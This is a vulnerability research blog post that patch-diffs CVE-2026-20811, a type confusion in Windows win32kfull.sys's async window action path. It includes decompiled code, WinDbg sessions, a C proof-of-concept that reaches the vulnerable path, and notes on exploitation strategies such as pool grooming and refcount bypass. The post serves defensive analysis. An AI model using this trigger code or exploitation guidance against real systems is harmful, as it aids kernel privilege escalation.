---
title: "CVE-2026-20811: Win32k Type Confusion in Cloud-Deployed Feature Flag"
date: 2026-03-29
categories: [Vulnerability Research, Windows Internals]
tags: [win32k, type-confusion, cve, kernel, windows-internals, patch-diffing, ida-pro, windbg]
toc: true
---

CVE-2026-20811 is a type confusion in `win32kfull.sys` (KB5074109, CVSS 7.8). The bug is in the async window action processing path introduced by a feature flag rollout (`Feature_ApplyWindowActionConvergence`), where a kernel pointer to a `CMonitorTopology` object survives incomplete sanitization of a cross-thread message buffer and is dereferenced in the receiving thread's context. Note: despite being patched in the same KB as CVE-2026-20805 (a DWM information disclosure vulnerability patched in the same update), CVE-2026-20811 itself is not listed in the CISA KEV catalog and has no public reports of in-the-wild exploitation as of this writing.

This post walks through the feature flag gating, the root cause, how the async buffer leaks kernel pointers, and what Microsoft changed in the patch. This is part of an ongoing effort to review Patch Tuesday patches and do vulnerability analysis on the fixes. I picked this one from the January 2026 batch because I had not looked at a type confusion in a kernel driver before and wanted to work through one.

## Background: NtUserApplyWindowAction and Feature Flags

`NtUserApplyWindowAction` is a Win32k syscall for applying window positioning operations: moves, resizes, snap layouts, z-order changes. It copies a `_WINDOW_ACTION` struct from user mode and dispatches it through internal processing.

The vulnerable code path did not exist at RTM. It was introduced when Microsoft enabled `Feature_ApplyWindowActionConvergence` via cloud configuration on builds around 26100.7000+. The feature gates a new code path through `WindowActions::xxxApplyAction` instead of the legacy `WindowActions::xxxApplyActionOld`. The new path handles cross-thread window actions differently, and that difference is where the bug lives.

```
26100.1      RTM. Feature OFF. Legacy path (xxxApplyActionOld). SAFE.
~26100.7000  Feature enabled via cloud rollout. New async path active.
             PostAsyncWindowAction copies full 0xB8 internal struct.
             CMonitorTopology* at +0xA8 survives sanitization. VULNERABLE.
26100.7309   Last vulnerable build. Feature ON, bug reachable.
26100.7623   Fix ships (KB5074109). Feature DISABLED via cloud config.
             Vulnerable code unchanged but unreachable. Safe alternative
             (event type 31, 0x60-byte copy) exists as dead code. MITIGATED.
```

This is a pattern worth tracking in modern Windows. Features ship via cloud config independently of OS builds. The vulnerability window is between feature enablement and security patch, and it can be invisible to anyone not tracking feature flag state.

## Attack Surface Analysis

### BinDiff Results

BinDiff between `win32kfull.sys` 10.0.26100.7309 (pre-patch) and 10.0.26100.7623 (post-patch) showed 99.25% overall similarity across 11,483 matched functions. Four functions changed:

| Function | Similarity | Basic Blocks |
|----------|-----------|--------------|
| `NtUserApplyWindowAction` | 93.2% | 54 |
| `NtUserSetWindowsHookAW` | 87.9% | 9 |
| `zzzSetWindowsHookEx` | 97.1% | 138 |
| `NtUserSetWindowsHookEx` | 97.3% | 51 |

`NtUserApplyWindowAction` at 93.2% similarity with 54 basic blocks is the primary target. The other three functions relate to a secondary fix for a hook handle return logic inversion, which I won't cover in detail here.

### Entry Points and Gates

On the pre-patch build (26100.7309), reaching the vulnerable code requires passing through two gates:

**Gate 1: Feature_ApplyWindowActionConvergence.** The feature flag's `featureState` must have bit 0 set (enabled). On production builds ~26100.7000+, this was enabled via cloud rollout. On my evaluation build (26100.5074), it was disabled (`featureState = 0x16`, bit 0 clear).

```
0: kd> dd fffff805`13e0c768 L1
fffff805`13e0c768  00000016
```

The feature evaluation function (`Feature_H2E_WPA3SAE__private_IsEnabledDeviceUsage_1` in IDA, reading from `Feature_ApplyWindowActionConvergence__private_featureState`) evaluates the feature state in two sequential stages. First, `test al, 10h` checks bit 4 as a fast-path gate: if bit 4 is clear, evaluation falls through to `IsEnabledFallback()`, a slower evaluation path that may check additional state. With `featureState = 0x16`, bit 4 is set (`0x16 & 0x10 = 0x10`), so the fast path passes and evaluation continues. Second, `and eax, 1` extracts bit 0, the actual enabled/disabled bit. With `0x16`, bit 0 is clear, so the feature evaluates as disabled. Patching to `0x17` sets bit 0, making the feature evaluate as enabled while preserving the fast-path gate.

**Gate 2: IAMThreadAccessGranted.** For cross-thread calls (where the caller thread does not own the target window), `xxxApplyAction` calls `IAMThreadAccessGranted`. This is expected to return TRUE for UWP apps and IAM-granted contexts. Standard Win32 apps fail this check.

On the evaluation build (26100.5074), there was a third gate (`IsAppModelFeatureEnabled`, checking `PEB+0x340` bit 0 for UWP context), but IDA analysis of the actual vulnerable build (26100.7309) confirmed this check does not exist there. The `xxxApplyAction` function on 26100.7309 checks DPI awareness, `IAMThreadAccessGranted`, `ValidateHwnd`, `IsTopLevelWindow`, and thread ownership, but not `IsAppModelFeatureEnabled`.

The DPI awareness check requires `SetProcessDpiAwarenessContext(-4)` (Per Monitor v2), which any Medium-IL process can call.

### Reaching the Async Path

The bug is specifically in the **cross-thread async** path. When `xxxApplyAction` determines that the caller thread is not the window owner thread (and `IAMThreadAccessGranted` returns TRUE), it sets `flags2` bit 0x800 in the internal `CWindowAction` struct:

```c
// xxxApplyAction - thread ownership check
if ( v14 == v9 )             // same thread owns the window
{
    v36 |= 0x2000u;          // bit 0x2000 = same-thread
}
else
{
    v36 |= 0x800u;           // bit 0x800 = cross-thread
    v40 = *((_QWORD *)v12 + 2);   // store target threadinfo
}
```

This causes `xxxApplyWindowAction` to call `PostAsyncWindowAction` instead of processing the action synchronously:

```c
// xxxApplyWindowAction - async dispatch gate
if ( Feature_ApplyWindowActionConvergence()
     && (*(_DWORD *)(a2 + 4) & 0x800) != 0 )    // flags2 & 0x800 (cross-thread)
{
    AdvancedWindowPos::PostAsyncWindowAction(a1, a2, v4);
    return;
}
```

## The Vulnerability

### Root Cause

`AdvancedWindowPos::PostAsyncWindowAction` allocates **0xB8 bytes**, copies the full internal `CWindowAction` struct into it, and posts this buffer as **event type 0x1C (28)** to the target thread's message queue:

```c
// PostAsyncWindowAction - allocation and copy
v22 = Win32AllocPoolZInit(0xB8, 0x70776155);   // 0xB8 bytes, pool tag 'Uawp'

*(_OWORD *)v22 = *(_OWORD *)a2;               // 0x00-0x0F
*(_OWORD *)(v22 + 16) = *((_OWORD *)a2 + 1);  // 0x10-0x1F
*(_OWORD *)(v22 + 32) = *((_OWORD *)a2 + 2);  // 0x20-0x2F
// ... (11 OWORD copies = 176 bytes)
*(_QWORD *)(v22 + 176) = *((_QWORD *)v30 + 6); // 0xB0-0xB7
// Total: 176 + 8 = 184 = 0xB8

PostEventMessageEx(..., 0x1Cu, ..., v22, ...);  // post as event type 0x1C
```

The `CWindowAction` struct at this point contains kernel pointers that were populated during processing on the caller's thread.

When the target thread pumps messages (`PeekMessage`/`GetMessage`), `xxxProcessEventMessage` dispatches event 0x1C to `AdvancedWindowPos::xxxProcessAsyncWindowAction`. This function performs a partial sanitization of the buffer before passing it to `xxxApplyWindowAction`. Here is the decompiled function from the pre-patch binary (26100.7309), annotated with the three fields it zeros and the one it misses:

```c
void __fastcall AdvancedWindowPos::xxxProcessAsyncWindowAction(
        HWND hwndFromEvent,       // rcx: HWND from PostEventMessageEx
        __int64 asyncBuffer)      // rdx: the 0xB8-byte copied buffer
{
    tagWND *pwnd = HMValidateHandleNoSecure(hwndFromEvent, 1);
    if (!pwnd || !IsTopLevelWindow(pwnd))
        return;  // window gone or not top-level, bail

    tagTHREADINFO *pti = PtiCurrent();
    Win32HM_LockIntoThread(pti, pwnd, ...);

    //
    // Check for recalc display change (flags1 & 0x200 with flags2 & 0x10000)
    //
    if ((*(_DWORD *)asyncBuffer & 0x200) != 0
        && (*((_DWORD *)asyncBuffer + 1) & 0x10000) != 0
        && (*((_DWORD *)pwnd + 95) & 0x10) == 0)
    {
        // WPP tracing only, no action applied
        return;
    }

    //
    // SANITIZATION (incomplete)
    //
    *((_DWORD *)asyncBuffer + 1) &= ~0x800u;   // [1] +0x04: clear cross-thread bit
    *((_QWORD *)asyncBuffer + 18) = 0;          // [2] +0x90: zero tagTHREADINFO*
    *((_BYTE *)asyncBuffer + 176) = 0;          // [3] +0xB0: zero byte

    // NOTE: +0xA8 (CMonitorTopology*) is NOT zeroed here.
    //       It survives into xxxApplyWindowAction and gets dereferenced.

    // Pass the full 0xB8 buffer to xxxApplyWindowAction
    AdvancedWindowPos::xxxApplyWindowAction(pwnd, asyncBuffer);
}
```

Three fields sanitized. The `CMonitorTopology*` at **offset +0xA8** is not zeroed. It survives sanitization and is dereferenced by `xxxApplyWindowAction`:

```c
// xxxApplyWindowAction+0xa86
CMonitorTopology *topology = *(CMonitorTopology **)(buffer + 0xA8);
CMonitorTopology::MonitorDataFromRect(topology, ...);   // DEREFERENCE
```

Further down, a double dereference occurs:

```c
*(_DWORD *)(*(_QWORD *)(buffer + 0xA8) + 12LL)   // *(*(buffer+0xA8)+0xC)
```

This value is passed to `CDwmWindowNotifyBatch::OnRecalcActionApplied`.

The `CMonitorTopology*` was placed in the buffer during Thread A's context (the caller thread). It is dereferenced in Thread B's context (the window owner thread) without validation. MSRC classifies this as both CWE-822 (Untrusted Pointer Dereference) and CWE-843 (Type Confusion). I think CWE-843 is the more precise classification: the buffer contains kernel-internal state that is reinterpreted as window action parameters on the receiving end. The pointer itself is a valid kernel object, not a user-supplied address, but the async boundary changes the trust context in which it is accessed.

### Buffer Layout

The 0xB8-byte async buffer has the following structure at the relevant offsets:

| Offset | Size | Type | Content | Sanitized? |
|--------|------|------|---------|-----------|
| +0x00 | 4 | `DWORD` | flags1 (e.g. 0x06) | No |
| +0x04 | 4 | `DWORD` | flags2 (bit 0x800 = cross-thread) | Yes (bit cleared) |
| +0x90 | 8 | `tagTHREADINFO*` | caller's thread info pointer | Yes (zeroed) |
| +0xA8 | 8 | `CMonitorTopology*` | monitor topology object pointer | **No** |
| +0xB0 | 1 | `BYTE` | unknown flag | Yes (zeroed) |

Three fields sanitized out of at least four kernel-internal fields in a 0xB8-byte struct. The sanitization was done by hand, field by field, and it missed one.

### The Type Confusion (CWE-843)

The type confusion is structural: the 0xB8-byte `CWindowAction` has a user zone and a kernel zone, though the boundary is not a clean split. `ResolvePublicWindowAction` validates the user-supplied `_WINDOW_ACTION` (0x60 bytes) and maps it into the internal `CWindowAction` at offsets +0x00 through +0x6B (flags, position, size, rects, snap state, and two display-change fields at +0x60 (target DPI value from `_WINDOW_ACTION+0x4C`, minimum 96, gated by `flags2 & 0x200`) and +0x64 (source point for monitor lookup from `_WINDOW_ACTION+0x50`, a QWORD consumed as X/Y by `MonitorDataFromRect`)). Offsets +0x04 (`flags2`) are shared: the user supplies bits and the kernel adds 0x800/0x2000 during processing. Offsets +0x6C through +0x8F appear to be gap space (zero-initialized, not written by either side in the paths I traced). The kernel populates fields at +0x90 and beyond during processing: `tagTHREADINFO*` at +0x90, `CMonitorTopology*` at +0xA8, and internal flags at +0xB0.

When `xxxProcessAsyncWindowAction` passes the full 0xB8 buffer to `xxxApplyWindowAction`, the kernel-internal zone is interpreted as if it contains valid `WindowAction` fields. Which offsets get read depends on the `flags1` and `flags2` bits in the buffer. Different flag combinations activate different code paths in `xxxApplyWindowAction`, each reading different offsets as coordinates, DPI values, rect structures, or pointers.

To verify this, I bruteforced flag combinations and monitored which code paths were reached on the async path via WinDbg breakpoints:

| flags1 | flags2 (effective) | Code path reached | Kernel data read |
|--------|-------------------|-------------------|-----------------|
| 0x06 | 0x00 | `MonitorDataFromRect` | +0xA8 as `CMonitorTopology*` |
| 0x106 | 0x00 | `xxxModifyActionForArrangement` | +0xA8 as `CMonitorTopology*`, +0x64 as POINT |
| 0x06 | 0x40000 | arrangement rect path | +0x98 as `tagRECT` (kernel data) |
| 0x06 | 0x10000 | `OnRecalcActionApplied` | `*(*(buffer+0xA8)+12)` double dereference |

![Flag-driven code path diagram](/assets/img/posts/2026-03-22_flag_code_paths.png)
_Async dispatch flow: `PostAsyncWindowAction` copies the 0xB8 buffer, `xxxProcessAsyncWindowAction` sanitizes 3 of 4 kernel fields, and `xxxApplyWindowAction` dispatches to different code paths based on the user-controlled flags. All four paths read from the kernel-internal zone of the buffer._

The flags2 values that passed validation and reached the async path: `0x00`, `0x01`, `0x10`, `0x20`, `0x40`, `0x80`, `0x100` (rejected), `0x200`, `0x400` (rejected), `0x10000`, `0x40000`. The kernel rejects certain bits in `ResolvePublicWindowAction`, but many pass through and activate code paths that read from the kernel-internal zone of the buffer.

For example, with `flags2=0x40000`, the arrangement rect path reads a `tagRECT` from offset +0x98 of the buffer. On the async path, +0x98 contains kernel-internal data (zeros in my testing, but potentially non-zero under different window states). The code treats these bytes as window coordinates and feeds them into positioning calculations.

The `flags2=0x10000` path is particularly interesting: it triggers a double dereference `*(_DWORD *)(*(_QWORD *)(buffer + 0xA8) + 12)`, reading a DWORD from `CMonitorTopology+12` and passing it to `CDwmWindowNotifyBatch::OnRecalcActionApplied`. An attacker who could control the memory at the topology address would control this value.

This is the core of CWE-843: data of one type (internal kernel state) is accessed as another type (user window action parameters). The incomplete sanitization in `xxxProcessAsyncWindowAction` is the gate failure that allows this type confusion to reach `xxxApplyWindowAction`.

### WinDbg Confirmation

Testing on build 26100.7309 with two WinDbg patches applied (feature flag enabled, `IAMThreadAccessGranted` patched to `mov eax, 1; ret`):

**The buffer arrives on Thread B with kernel pointers intact.** When `xxxProcessAsyncWindowAction` is hit, `rdx` points to the 0xB8-byte copied buffer. Dumping the flags at the start shows `flags1=0x06` (position+size) and `flags2=0x0800` (cross-thread bit, set by the kernel). The kernel zone starting at +0x6C is mostly zeros for this flag combination, but +0x90 contains a `tagTHREADINFO*` from the calling thread, and +0xA8 contains a `CMonitorTopology*`. The call stack confirms this is the async dispatch path through `xxxProcessEventMessage` from Thread B's `PeekMessage` call:

```
0: kd> dd @rdx L2
ffff8087`f94e9d30  00000006 00000800

0: kd> dq @rdx+0x90 L1
ffff8087`f94e9dc0  ffff8087`f785f010

0: kd> dq @rdx+0xA8 L1
ffff8087`f94e9dd8  ffff8087`fc9e5f90

0: kd> kb L6
 # RetAddr               : Args to Child                                                           : Call Site
00 fffff801`222305e0     : ffff8087`f785f010 fffff18c`48aebc00 : win32kfull!AdvancedWindowPos::xxxProcessAsyncWindowAction
01 fffff801`2226d874     : fffff18c`48aec9c0 00000000`00000000 : win32kfull!xxxProcessEventMessage+0x814
02 fffff801`220e84db     : 00000000`0000304f 00000000`00000001 : win32kfull!xxxScanSysQueue+0xa30
03 fffff801`220e7926     : fffff18c`48aec9c0 fffff801`21862ca6 : win32kfull!xxxRealInternalGetMessage+0xa3f
04 fffff801`220e780d     : 00000000`00000000 000000d3`e30ff7e0 : win32kfull!xxxInternalGetMessage+0x76
05 fffff801`1dd11077     : 00000000`00000000 00000000`00000000 : win32kfull!NtUserPeekMessage+0xfd
```

**After sanitization, `xxxApplyWindowAction` loads the surviving `CMonitorTopology*` from the buffer.** At offset `+0xa86` into the function, the instruction `mov rcx, [r15+0A8h]` loads the kernel pointer from the async buffer (pointed to by `r15`) into `rcx`, which is then passed as the first argument to `CMonitorTopology::MonitorDataFromRect`. This is the type confusion in action: a kernel-internal field from the `CWindowAction` struct is read as a `WindowAction` parameter and dereferenced in the receiving thread's context:

```
0: kd> r r15
r15=ffff8087f94e9d30

0: kd> dq @r15+0xa8 L1
ffff8087`f94e9dd8  ffff8087`fc9e5f90

0: kd> u @rip L1
win32kfull!AdvancedWindowPos::xxxApplyWindowAction+0xa86:
fffff801`222c7c6a 498b8fa8000000  mov     rcx,qword ptr [r15+0A8h]
```

The `CMonitorTopology*` value `ffff8087'fc9e5f90` is loaded into `rcx` and passed directly to `MonitorDataFromRect`, which dereferences it to read monitor topology data. This was confirmed across 26+ iterations with varying topology addresses. The pointer consistently survives sanitization and is dereferenced.

![CMonitorTopology* at buffer+0xA8 loaded into rcx for dereference by MonitorDataFromRect](/assets/img/posts/2026-03-22_windbg_type_confusion.png)
_Figure 1: The async buffer arrives on Thread B via `xxxProcessAsyncWindowAction`. The buffer dump shows `flags1=0x06`, `flags2=0x0800` (cross-thread), and the `CMonitorTopology*` at `+0xA8` (`ffff8087'fc9e5f90`). At `xxxApplyWindowAction+0xa86`, the instruction `mov rcx,[r15+0A8h]` loads this kernel pointer into `rcx` for dereference by `MonitorDataFromRect`._

### Pool Verification

`!pool` on the buffer address confirms the allocation metadata:

```
0: kd> !pool ffffc580968101e0
*ffffc580968101e0 size:   d0 previous size:    0  (Allocated) *Uawp
        Pooltag Uawp : USERTAG_AWP, Binary : win32kfull!AdvancedWindowPos
```

Paged pool, tag `Uawp` (`USERTAG_AWP`), allocation size 0xD0 (0xB8 usable + 0x18 pool header/alignment). The uniform 0xD0 allocation sizes on the pool page are consistent with kLFH servicing this bucket, which is relevant for any heap-based exploitation strategy targeting this allocation.

### BSOD Confirmation

To confirm the dereference is reachable and crashes when the `CMonitorTopology` object is invalid, I zeroed the pointer at +0xA8 via a WinDbg conditional breakpoint on `xxxProcessAsyncWindowAction` (simulating a freed topology). The system immediately bugchecks with `SYSTEM_SERVICE_EXCEPTION (3b)` when `MonitorDataFromRect` attempts to access the NULL object:

```
0: kd> !analyze -v

SYSTEM_SERVICE_EXCEPTION (3b)
An exception happened while executing a system service routine.
Arguments:
Arg1: 00000000c0000005, Exception code that caused the BugCheck
Arg2: fffff80122011530, Address of the instruction which caused the BugCheck

Failure.Bucket: AV_win32kfull!CMonitorTopology::MonitorDataFromRect

CONTEXT:  fffff18c44af9eb0 -- (.cxr 0xfffff18c44af9eb0)
rax=0000000000000000 rbx=fffff18c44afaab0 rcx=00000000000001ff
rdx=0000000000000064 rsi=0000000000000004 rdi=0000000000000384
rip=fffff80122011530 rsp=fffff18c44afa8e0 rbp=0000000000000004
 r8=0000000000000002  r9=0000000000000000

win32kfull!CMonitorTopology::MonitorDataFromRect+0x6c:
fffff801`22011530 44394d00        cmp     dword ptr [rbp],r9d ss:0018:00000000`00000004=????????

PROCESS_NAME:  poc_async_tc.exe

STACK_TEXT:
fffff18c`44afa8e0 fffff801`222c7c85 : win32kfull!CMonitorTopology::MonitorDataFromRect+0x6c
fffff18c`44afa9c0 fffff801`222c909f : win32kfull!AdvancedWindowPos::xxxApplyWindowAction+0xaa1
fffff18c`44afab30 fffff801`222305e0 : win32kfull!AdvancedWindowPos::xxxProcessAsyncWindowAction+0x12f
fffff18c`44afaba0 fffff801`2226d874 : win32kfull!xxxProcessEventMessage+0x814
fffff18c`44afacc0 fffff801`220e84db : win32kfull!xxxScanSysQueue+0xa30
fffff18c`44afb6a0 fffff801`220e7926 : win32kfull!xxxRealInternalGetMessage+0xa3f
fffff18c`44afb930 fffff801`220e780d : win32kfull!xxxInternalGetMessage+0x76
fffff18c`44afb970 fffff801`1dd11077 : win32kfull!NtUserPeekMessage+0xfd
fffff18c`44afba20 fffff801`8c4b5658 : win32k!NtUserPeekMessage+0x67
fffff18c`44afba70 00007ffd`d91712c4 : nt!KiSystemServiceCopyEnd+0x28
00000038`b3cffa18 00007ffd`da9fe0ef : win32u!NtUserPeekMessage+0x14
00000038`b3cffa20 00007ffd`da9fe078 : USER32!_PeekMessage+0x3f
00000038`b3cffa90 00007ff7`c9bd1155 : USER32!PeekMessageW+0x168
00000038`b3cffb00 00000000`0005030a : poc_async_tc+0x1155
```

The faulting instruction `cmp dword ptr [rbp], r9d` with `rbp=0x4` is a NULL dereference: the zeroed `CMonitorTopology*` was loaded, `MonitorDataFromRect` computed a field offset (+0x4) from the NULL base, and the read at address 0x4 triggered the access violation. Note: the stack shows `xxxApplyWindowAction+0xaa1` rather than `+0xa86` because `+0xa86` is the `mov rcx,[r15+0A8h]` load instruction while `+0xaa1` is the return address after the `call` to `MonitorDataFromRect`. The full call stack traces back through `xxxProcessAsyncWindowAction` (the async event handler) to `NtUserPeekMessage` (Thread B's message pump) and finally to `poc_async_tc.exe` (the PoC).

This confirms the end-to-end crash path: user-mode PoC triggers a cross-thread `NtUserApplyWindowAction`, `PostAsyncWindowAction` copies the 0xB8-byte buffer with the `CMonitorTopology*` at +0xA8, Thread B's `PeekMessage` dispatches the event through `xxxProcessAsyncWindowAction` (which fails to sanitize +0xA8), and `xxxApplyWindowAction` dereferences the pointer via `MonitorDataFromRect`, causing a kernel bugcheck.

![BSOD at MonitorDataFromRect when CMonitorTopology* is invalid](/assets/img/posts/2026-03-22_windbg_bsod_analyze.png)
_Figure 2: `!analyze -v` output after the BSOD. The crash occurs at `CMonitorTopology::MonitorDataFromRect+0x6c` with `rbp=0x4` (NULL dereference at field +0x4). The call stack traces through `xxxProcessAsyncWindowAction` back to `poc_async_tc.exe`._

## The Patch

Comparing the pre-patch (26100.7309) and post-patch (26100.7623) binaries in IDA reveals something I didn't expect: **the vulnerable code path is identical in both binaries.**

`PostAsyncWindowAction` still allocates 0xB8 bytes, still copies the full internal struct, still posts event type 0x1C. `xxxProcessAsyncWindowAction` still zeros only the same three fields. `xxxApplyWindowAction` still dereferences the `CMonitorTopology*` at +0xA8 via `MonitorDataFromRect`. Every function in the vulnerable chain is byte-for-byte the same.

The BinDiff showed `NtUserApplyWindowAction` changed at 93.2% similarity. Here is the actual diff:

**Pre-patch `NtUserApplyWindowAction`:**
```c
if (!Feature_ApplyWindowActionConvergence()) {
    //
    // OLD path: xxxApplyActionOld (single variant)
    //
} else {
    xxxApplyAction(...);  // NEW path (vulnerable async dispatch)
}
```

**Post-patch `NtUserApplyWindowAction`** (note: the branch order is inverted relative to the pre-patch decompiler output, but the logic is identical: feature ON routes to the new path)**:**
```c
if (Feature_ApplyWindowActionConvergence()) {
    xxxApplyAction(...);  // NEW path (STILL here, identical code)
} else {
    //
    // OLD path: now sub-gated by a secondary feature flag (_41)
    //
    if (Feature_ApplyWindowActionConvergence_41()) {
        xxxApplyActionOld(...);  // variant A (new error handling)
    } else {
        xxxApplyActionOld(...);  // variant B (original)
    }
}
```

The 93.2% BinDiff delta comes entirely from the added `_41` sub-gate in the old path, which adds new error handling to `xxxApplyActionOld`. The hook handle return logic fix is separate and accounts for the changes in the other three functions (`NtUserSetWindowsHookAW`, `zzzSetWindowsHookEx`, `NtUserSetWindowsHookEx`). The new path containing the type confusion is untouched.

**The fix is feature flag disablement.** Microsoft disabled `Feature_ApplyWindowActionConvergence` via cloud configuration update, making `xxxApplyAction` unreachable. The vulnerable code remains as dead code in the patched binary.

This is the same mechanism that created the bug in the first place: the feature was cloud-enabled on ~26100.7000+ production builds (opening the vulnerability window), and the patch disables it via cloud config (closing the window). The binary update (KB5074109) ships the `_41` sub-gate for the old path, but the `featureState` in the post-patch binary is `0xFFFFFFFF` (the WFC sentinel, identical to pre-patch), meaning the feature enablement is controlled entirely via cloud configuration, not hardcoded in the binary. The code-level vulnerability in the async path is unchanged.

### The Safe Alternative (Dead Code in Both Binaries)

A properly designed alternative already exists in both the pre-patch and post-patch binaries. The event type 31 handler in `xxxProcessEventMessage` copies only 0x60 bytes and passes the `CMonitorTopology*` as a separate argument:

```c
// Event type 31 handler (present in BOTH pre-patch and post-patch)
v67 = *(_OWORD **)(eventMsg + 40);     // pointer to the async buffer
v68 = *(_QWORD *)(eventMsg + 32);      // CMonitorTopology* as separate param

v80[0] = *v67;        // copy bytes 0x00-0x0F
v80[1] = v67[1];      // copy bytes 0x10-0x1F
v80[2] = v67[2];      // copy bytes 0x20-0x2F
v80[3] = v67[3];      // copy bytes 0x30-0x3F
v80[4] = v67[4];      // copy bytes 0x40-0x4F
v80[5] = v67[5];      // copy bytes 0x50-0x5F
                       // bytes 0x60-0xB7: NOT COPIED

WindowActions::xxxApplyActionAsync(window, v68, v80);
```

This is an allow-list approach: only the first 0x60 bytes (the user-controlled `_WINDOW_ACTION` data) are copied. Everything from +0x60 through +0xB8, including the `CMonitorTopology*` at +0xA8, is not copied. The topology is passed as its own argument from a trusted source, not extracted from the untrusted async buffer.

This handler is not currently wired into the `PostAsyncWindowAction` path. It exists as separate infrastructure, likely intended for when Microsoft re-enables the feature with a proper code fix. Until then, the "fix" is the feature being off, and the vulnerable dead code remains in the binary. Worth monitoring in future Patch Tuesday updates. If `Feature_ApplyWindowActionConvergence` is ever re-enabled without switching the async path to event type 31, the type confusion returns.

## Exploitation Considerations

The primitive here is a kernel pointer dereference (`CMonitorTopology*`) in the target thread's context. `MonitorDataFromRect` reads topology fields, `PhysicalToLogicalDPIRect` performs DPI calculations using topology data, and `OnRecalcActionApplied` receives `*(topology+12)`. The double dereference pattern (`*(*(buffer+0xA8)+0xC)`) means an attacker who could control the memory at the `CMonitorTopology*` address would control values that flow into DPI calculations and DWM notifications.

The `CMonitorTopology*` in the async buffer **is reference-counted**. After successfully posting the event, `PostAsyncWindowAction` increments the topology's refcount:

```c
// PostAsyncWindowAction - after successful PostEventMessageEx
if ( PostEventMessageEx(...) )
{
    _InterlockedAdd(v24[21], 1u);   // v24[21] = *(buffer+0xA8) = CMonitorTopology*
                                    // increments refcount at *(CMonitorTopology+0)
}
```

The decompiler hides the two-step indirection. The assembly makes it explicit:

```asm
mov  rax, [rbx+0A8h]    ; load CMonitorTopology* from buffer+0xA8
lock add [rax], ebp      ; atomically: *(topology+0) += 1   (ebp = 1)
```

On cleanup, `CleanEventMessage` (case 0x1C) releases the reference and frees the buffer:

```c
// CleanEventMessage - event type 0x1C cleanup
case 0x1C:
    v3 = *((CMonitorTopology ***)a1 + 5);   // buffer pointer
    CMonitorTopology::Release(v3[21]);        // Release refcount at buffer + 0xA8
    Win32FreePool(v3);                        // free the 0xB8 buffer
```

This AddRef/Release pair keeps the topology object alive for the duration of the async event's lifetime and explains why my UAF attempts via `ChangeDisplaySettingsEx` racing were unsuccessful: the extra reference prevents the object from being freed while the event is in flight.

This makes direct use-after-free through topology object lifetime manipulation significantly harder. The topology would need to be freed through a path that bypasses the reference count, or the reference count itself would need to be corrupted.

Microsoft rated this CVSS 7.8 (EoP). No in-the-wild exploitation of this specific CVE has been publicly confirmed. Given the reference counting, a full exploitation chain would likely need to either: (1) find a path that frees the `CMonitorTopology` object without going through the reference count, or corrupt the reference count itself, or (2) exploit the cross-context nature of the bug (Thread A's topology used in Thread B's context) where the topology may be invalid if the threads are on different desktops or in different DPI contexts. The type confusion primitive (kernel-internal fields read as window action parameters) is the more immediately exploitable aspect, since the attacker controls which offsets get read via the flags in their input.

The trigger conditions (feature flag enabled, cross-thread call, IAM access, Per Monitor v2 DPI) are all satisfiable from a Medium-IL UWP app without any privilege escalation. UWP apps are expected to pass the `IAMThreadAccessGranted` check and can call `NtUserApplyWindowAction` through `win32u.dll`.

## PoC

The PoC creates two threads in the same process: Thread A (the caller) and Thread B (the window owner). Thread A calls `NtUserApplyWindowAction` targeting Thread B's window. Because the threads are different, the kernel sets `flags2` bit 0x800 (cross-thread) in the internal `CWindowAction`, which triggers `PostAsyncWindowAction` to post the 0xB8-byte buffer as an event to Thread B's message queue.

```c
//
// Thread B: creates a window and pumps messages
//
static unsigned __stdcall WindowOwnerThread(void *arg)
{
    WNDCLASSW wc = {0};
    wc.lpfnWndProc = DefWindowProcW;
    wc.hInstance = GetModuleHandleW(NULL);
    wc.lpszClassName = L"AsyncTC_B";
    RegisterClassW(&wc);

    HWND h = CreateWindowExW(0, L"AsyncTC_B", L"B",
                              WS_OVERLAPPEDWINDOW | WS_VISIBLE,
                              100, 100, 400, 300,
                              NULL, NULL, wc.hInstance, NULL);
    g_threadBWindow = h;

    MSG msg;
    while (g_keepRunning) {
        while (PeekMessageW(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
        Sleep(1);
    }
    DestroyWindow(h);
    return 0;
}

//
// Thread A (main): fires cross-thread NtUserApplyWindowAction
//
int main()
{
    SetProcessDpiAwarenessContext((HANDLE)-4);

    //
    // Resolve NtUserApplyWindowAction from win32u.dll
    //
    HMODULE hWin32u = LoadLibraryW(L"win32u.dll");
    auto pApply = (BOOL(WINAPI*)(HWND, void*))
        GetProcAddress(hWin32u, "NtUserApplyWindowAction");

    //
    // Start Thread B with a window
    //
    _beginthreadex(NULL, 0, WindowOwnerThread, NULL, 0, NULL);
    Sleep(500);

    //
    // Craft _WINDOW_ACTION: position + size (flags1 = 0x06)
    //
    BYTE action[0x60] = {0};
    *(DWORD*)(action + 0x00) = 0x06;   // flags1: position + size
    *(DWORD*)(action + 0x0C) = 100;    // x
    *(DWORD*)(action + 0x10) = 100;    // y
    *(DWORD*)(action + 0x14) = 800;    // width
    *(DWORD*)(action + 0x18) = 600;    // height

    // Fire: Thread A -> Thread B's window (cross-thread)
    // Kernel sets flags2 |= 0x800 -> PostAsyncWindowAction fires
    // 0xB8-byte buffer with CMonitorTopology* at +0xA8 is posted
    BOOL result = pApply(g_threadBWindow, action);
    // result = TRUE, async event queued to Thread B
}
```

On execution, `NtUserApplyWindowAction` returns TRUE and Thread B's window repositions on each call. The flag bruteforce variant confirms the async path is taken across multiple flag combinations:

```
PS> .\poc_async_tc.exe
[*] Flag bruteforce to find async code paths

[+] Thread B: HWND=00000000000300B6 TID=8988
[+] Cross-thread OK

[*] Testing 5 flags1 x 31 flags2 = 155 combinations
[+] flags1=0x0006 flags2=0x00000 -> OK (async path taken)
[+] flags1=0x0006 flags2=0x00001 -> OK (async path taken)
[+] flags1=0x0006 flags2=0x00002 -> OK (async path taken)
[+] flags1=0x0006 flags2=0x00010 -> OK (async path taken)
[+] flags1=0x0006 flags2=0x00020 -> OK (async path taken)
[+] flags1=0x0006 flags2=0x00040 -> OK (async path taken)
[+] flags1=0x0006 flags2=0x00080 -> OK (async path taken)
[+] flags1=0x0006 flags2=0x00200 -> OK (async path taken)
[+] flags1=0x0006 flags2=0x01000 -> OK (async path taken)
[+] flags1=0x0006 flags2=0x10000 -> OK (async path taken)
[+] flags1=0x0006 flags2=0x40000 -> OK (async path taken)
...
```

No crash occurs under normal conditions because the topology is valid and reference-counted.

